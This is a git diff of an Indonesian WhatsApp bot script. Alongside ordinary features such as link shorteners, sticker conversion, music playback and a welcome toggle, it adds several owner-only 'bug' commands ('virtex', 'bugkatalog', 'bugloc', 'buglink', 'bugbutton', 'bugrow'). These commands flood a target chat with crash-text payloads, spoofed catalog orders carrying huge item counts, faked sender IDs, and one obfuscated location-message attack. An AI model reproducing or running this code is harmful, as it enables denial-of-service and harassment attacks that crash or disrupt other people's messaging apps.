+ini_result = await fetchJson(`http://hadi-api.herokuapp.com/api/bitly?url=${short}`,{method:'get'})
+get_result = ini_result.result
+ini_txt = `bitly shortlink`
+ini_txt += `Shortlink : ${get_result}`
+reply (ini_txt)
+break
+case 'shorturl':
+ reply(mess.wait)
+ if (args.length == 0) return reply(`Format salah! dibutuhkan (${prefix + command} (url with http://)) Example: ${prefix + command} http://panel.vinny.wtf/`)
+short = args.join(" ")
+ini_result = await fetchJson(`http://hadi-api.herokuapp.com/api/shorturl?url=${short}`,{method:'get'})
+get_result = ini_result.result
+ini_txt = `shorturl shortlink`
+ini_txt += `Shortlink : ${get_result}`
+reply (ini_txt)
+break
+case 'cuttly':
+reply(mess.wait)
+if (args.length == 0) return reply(`Format salah! dibutuhkan (${prefix + command} (url with http://)) Example: ${prefix + command} http://panel.vinny.wtf/`)
+short = args.join(" ")
+ini_result = await fetchJson(`http://hadi-api.herokuapp.com/api/cuttly?url=${short}`,{method:'get'})
+get_result = ini_result.result
+ini_txt = `cuttly shortlink`
+ini_txt += `Shortlink : ${get_result}`
+reply (ini_txt)
+break 
+    case 'tomp4':
+            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
+            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
+            owgi = await denz.downloadAndSaveMediaMessage(ger)
+            webp2mp4File(owgi).then(res=>{
+            sendMediaURL(from,res.result,'Done')
+            })
+            }else {
+            reply('reply stiker')
+            }
+            fs.unlinkSync(owgi)
+            break
 case 'sharelock':
 kntl = `${args.join(' ')}`
 nama = kntl.split("|")[0];
@@ -2618,7 +2932,7 @@ reply('Sukses bergabung dalam group')
 break
 				case 'totag':
 			if (!isGroup) return reply(mess.only.group)
-			if (!isGroupAdmins) return reply(mess.only.admin)
+			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
             if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
             encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
             file = await denz.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
@@ -2903,7 +3217,7 @@ break
 					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 					if (args.length < 1) return reply('Jumlahnya?')
 				 for (let i = 0; i < args[0]; i++) {
-await denz.toggleDisappearingMessages(from, 0)
+await denz.relayWAMessage(denz.prepareMessageFromContent(from, denz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
 }
 reply('Sukses send bug sebanyak '+args.join(' '))
 					break
@@ -2975,6 +3289,94 @@ bug(targett)
 }
 
 attack(mek.key.remoteJid)
+break
+case 'virtex':
+if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
+katalog(`${ngazap(prefix)}`)
+katalog(`${emoji2(prefix)}`)
+katalog(`${virtex(prefix)}`)
+katalog(`${virtex2(prefix)}`)
+katalog(`${virtex3(prefix)}`)
+katalog(`${virtex4(prefix)}`)
+katalog(`${virtex5(prefix)}`)
+katalog(`${virtex6(prefix)}`)
+katalog(`${virtex7(prefix)}`)
+katalog(`${virtex8(prefix)}`)
+katalog(`${virtex9(prefix)}`)
+katalog(`${virtag(prefix)}`)
+break
+case 'bugkatalog':
+if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
+denz.toggleDisappearingMessages(from, 0)
+ babi = (teks) => {
+             res = denz.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": teks, "footerText": `${emoji2(prefix)}`, "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted: {
+  key: {
+   participant: '0@s.whatsapp.net' // Fake sender Jid
+  },
+  message: {
+   orderMessage: {
+    itemCount: 9999999, // Bug
+    status: 1,
+    surface: 1,
+    message: `${virtex6(prefix)}`,
+    orderTitle: `${emoji2(prefix)}`, // Idk what this does
+    sellerJid: '0@s.whatsapp.net' // Seller
+   }
+  }
+ }
+})
+             denz.relayWAMessage(res)
+        }
+        babi(`${ngazap(prefix)}`)
+        babi(`${virtag(prefix)}`)
+        babi(`${virtex6(prefix)}`)
+        babi(`${emoji2(prefix)}`)
+        break
+case 'bugloc':
+function _0x4ee9(_0x1253de,_0x4df4d5){var _0x587b3c=_0x587b();return _0x4ee9=function(_0x4ee946,_0x170efd){_0x4ee946=_0x4ee946-0x1c6;var _0x33a62e=_0x587b3c[_0x4ee946];return _0x33a62e;},_0x4ee9(_0x1253de,_0x4df4d5);}var _0x1fb12b=_0x4ee9;function _0x587b(){var _0x573ab6=['readFileSync','12536840GCstSf','sendMessage','only','536IkuDmm','key','2675700WtsjtO','ownerB','./denz.jpg','fromMe','2224464MiisaG','18qcFOZT','83468rQXPeY','0@s.whatsapp.net','25944fErnRh','115851EirsKL','184fyRhDo','178400WTzYEN'];_0x587b=function(){return _0x573ab6;};return _0x587b();}(function(_0x2dcd13,_0x2f923e){var _0x3d06c1=_0x4ee9,_0x2352ff=_0x2dcd13();while(!![]){try{var _0x266d76=parseInt(_0x3d06c1(0x1cc))/0x1+-parseInt(_0x3d06c1(0x1ce))/0x2+-parseInt(_0x3d06c1(0x1cb))/0x3*(parseInt(_0x3d06c1(0x1cd))/0x4)+-parseInt(_0x3d06c1(0x1d5))/0x5+-parseInt(_0x3d06c1(0x1c7))/0x6+-parseInt(_0x3d06c1(0x1c9))/0x7*(parseInt(_0x3d06c1(0x1d3))/0x8)+-parseInt(_0x3d06c1(0x1c8))/0x9*(-parseInt(_0x3d06c1(0x1d0))/0xa);if(_0x266d76===_0x2f923e)break;else _0x2352ff['push'](_0x2352ff['shift']());}catch(_0x4d3113){_0x2352ff['push'](_0x2352ff['shift']());}}}(_0x587b,0x6953b));if(!isOwner&&!mek[_0x1fb12b(0x1d4)][_0x1fb12b(0x1c6)])return reply(mess[_0x1fb12b(0x1d2)][_0x1fb12b(0x1d6)]);denz[_0x1fb12b(0x1d1)](from,{'degreesLatitude':6.493187928699356,'degreesLongitude':80.30968201252108,'name':''+emoji2(prefix),'address':''+virtex6(prefix),'jpegThumbnail':fs[_0x1fb12b(0x1cf)](_0x1fb12b(0x1d7))},location,{'quoted':{'key':{'participant':_0x1fb12b(0x1ca)},'message':{'orderMessage':{'itemCount':0x98967f,'status':0x1,'surface':0x1,'message':''+NamaBot,'orderTitle':''+NamaOwner,'sellerJid':'0@s.whatsapp.net'}}}});
+         break
+                case 'buglink':
+                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
+                 await denz.relayWAMessage(denz.prepareMessageFromContent(from, denz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
+               denz.sendMessage(from, virtex3(prefix), text, { quoted:ftrol, contextInfo :{text: '🔥',
+            "forwardingScore": 1000000000,
+            isForwarded: false,
+            sendEphemeral: false,
+            "externalAdReply": {
+                "title": `${virtex2(prefix)}`,
+                "body": "",
+                "previewType": "PHOTO",
+                "thumbnailUrl": "https://i.ibb.co/3hrZZ6s/tsukasa.png",
+                "thumbnail": fs.readFileSync(`./denz.jpg`),
+                "sourceUrl": "https://chat.whatsapp.com/HQCry1KsxNE3C6GTK2QAiJ"}}})
+                break
+        case 'bugbutton':
+        if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
+        await denz.relayWAMessage(denz.prepareMessageFromContent(from, denz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
+        sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {jpegThumbnail:ofrply}, [{buttonId:`${prefix}bbaij72njnwjibdo16830nslm1782`,buttonText:{displayText:'IMP-GANZ🌹'},type:1}])
+        await denz.relayWAMessage(denz.prepareMessageFromContent(from, denz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
+break
+case 'bugrow':
+if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
+denz.toggleDisappearingMessages(from, 0)
+ listMsg = {
+ buttonText: 'LIST MENU',
+ footerText: `${emoji2(prefix)}`,
+ description: `${virtex6(prefix)}`,
+ sections: [
+                     {
+                      "title": "CieKontol",
+ rows: [
+                          {
+                              "title": "CieBug",
+                              "rowId": ""
+                           }
+                        ]
+                     }],
+ listType: 1
+}
+denz.sendMessage(from, listMsg, MessageType.listMessage, {quoted:ftrol})
+await denz.relayWAMessage(denz.prepareMessageFromContent(from, denz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
 break
 case 'bugtroli2':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
@@ -3170,24 +3572,32 @@ break
 						}
 						break
                     case 'play':
-                            if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
-                            const playy = await axios.get(`https://bx-hunter.herokuapp.com/api/yt/search?query=${body.slice(6)}&apikey=${HunterApi}`)
-                            const mulaikah = playy.data.result[0].url
-                            try {
-                                reply(mess.wait)
-                                yta(mulaikah)
-                                .then((res) => {
-                                    const { dl_link, thumb, title, filesizeF, filesize } = res
-                                    axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
-                                    .then(async (a) => {
-                                    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `❏ *PLAYmp3*\n\n❏ *Title* : ${title}\n❏ *Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Maaf durasi melebihi batas maksimal, Silahkan klik link diatas_`)
-                                    sendFileFromUrl(dl_link, document, {mimetype: 'audio/mp3', filename: `${title}.mp3`, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:title,body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:"https://youtu.be/Ejl9sLbgc1A"}}}).catch(() => reply(mess.error.api))
-                                    })
-                                })
-                            } catch (err) {
-                                reply(mess.error.api)
-                            }
-                            break
+            if (args.length == 0) return reply(`Example: ${prefix + command} vide 1detik`)
+            query = args.join(" ")
+            get_resultL = await fetchJson(`https://ziy.herokuapp.com/api/play?apikey=xZiyy&judul=${query}`)
+            get_resultP = get_resultL.result
+            textP =`
+*YOUTUBE PLAY*
+
+Judul : ${get_resultP.judul}
+Link : ${get_resultP.url_audio}
+            `
+            denz.sendMessage(from, textP, text,{contextInfo:{
+            "forwardingScore": 1000000000,
+            isForwarded: false,
+            sendEphemeral: false,
+            "externalAdReply": {
+            "title": `Hallo ${pushname}` ,
+            "body": `Nih ${query} nya`,
+            "mediaType": "2",
+            "thumbnailUrl": `${get_resultP.image_thumbnail}`,
+            "mediaUrl": "https://youtu.be/R3lvRF23CJg",
+            "thumbnail": fs.readFileSync("./denz.jpg"),
+            "sourceUrl": "http://ziy.herokuapp.com"
+            },mentionedJid:[sender]}, quoted : mek})
+            get_audio = await getBuffer(get_resultP.url_audio)
+            denz.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, filename: `${get_resultP.title}.mp3`, quoted: mek})
+            break
                             case 'video':
                             if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _Judul video yang akan dicari_`)
                             const playi = await axios.get(`https://bx-hunter.herokuapp.com/api/yt/search?query=${body.slice(6)}&apikey=${HunterApi}`)
@@ -3565,6 +3975,33 @@ break
 					reply(`Sukses membuat grup ${argz[0]}`)
                 }
 				break
+   case 'welcome': 
+              if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
+	        if (!isGroup) return reply(mess.only.group)
+			if (!isOwner && !isGroupAdmins) return sticAdmin(from)
+					if (args[0] === 'on') {
+						if (isWelkom) return reply('Sudah Aktif Kak')
+						welkom.push(from)
+						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
+						reply('Sukses mengaktifkan fitur welcome')
+					} else if (args[0] === 'off') {
+						if (!isWelkom) return reply('Sudah Mati Kak')
+						var ini = welkom.indexOf(from)
+						welkom.splice(ini, 1)
+						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
+						reply('Sukses menonaktifkan fitur welcome')
+					} else if (!c){
+ anu =`Silahkan pilih salah satu\n\non: untuk mengaktifkan\noff: untuk menonaktifkan`
+punten = [{buttonId: 'welcome off', buttonText: {displayText: 'OFF✖️'}, type: 1},{buttonId: 'welcome on', buttonText: {displayText: 'ON✔️'}, type: 1}]
+const btngrass = {
+    contentText: `${anu}`,
+    footerText: '*_©IMP-XBOT_*',
+    buttons: punten,
+    headerType: 1
+}
+await denz.sendMessage(from, btngrass, MessageType.buttonsMessage, {quoted: ftrol})
+					}
+					break
 			case 'addrespon':
 			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 				if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon hai|hai juga`)
@@ -3765,7 +4202,7 @@ Giliran = @${tty.player1.split('@')[0]}`
             if (!e.includes("Cannot set property 'mtype' of undefined")) {
             if (!e.includes("jid is not defined")) {
      console.log(color('|ERR|', 'red'), color(e, 'cyan'))
-     denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `─────「 *ALERT-ERROR* 」─────\n\n\`\`\`${e}\`\`\`\n\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
+     denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `─────「 *ALERT-ERROR* 」─────\n\n\`\`\`${e}\`\`\`\n\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6285774523785?text=Assalamualaikum"}}})
 	}
     }
     }
